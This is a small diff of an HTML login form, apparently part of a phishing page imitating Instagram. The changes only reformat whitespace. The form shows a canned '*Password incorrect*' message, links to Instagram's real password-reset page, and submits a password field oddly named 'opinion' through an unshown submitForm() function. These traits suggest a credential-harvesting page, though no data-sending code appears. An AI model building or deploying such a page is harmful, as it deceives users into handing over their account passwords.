@@ -74,9 +74,9 @@
   <input type="text" id="username" name="name" placeholder="Username" required>
       <input type="password" id="password" name="opinion" placeholder="Password" required>
       <p class="red-text">*Password incorrect* Please check your password and try again</p>
-      <br><h5><a href="https://www.instagram.com/accounts/password/reset/">Forgotten your password ?</a></h5></br>
+      <br> <h5> <a href="https://www.instagram.com/accounts/password/reset/">Forgotten your password ?</a> </h5> </br>
 
-   <button type="button" id="loginButton" onclick="submitForm()">Login</button>
+  <button type="button" id="loginButton" onclick="submitForm()">Login</button>
       
  </form>
     
